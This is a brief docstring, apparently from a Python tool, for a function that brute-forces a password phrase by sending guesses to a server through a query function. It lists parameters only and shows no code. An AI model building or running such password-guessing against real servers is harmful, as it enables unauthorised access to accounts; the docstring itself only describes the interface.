        This function provides simple brute force algorithm for password phrase.

        Parameters:
            alphabet (str): A character set for the search in many variations.
            length (int) : Minimal length of password phrase
            query (func) : Function, that request to server.
            query_settings_dict (dict) : Dictionary with current settings.
            iter_number (int) : Number of iteration in cycle.
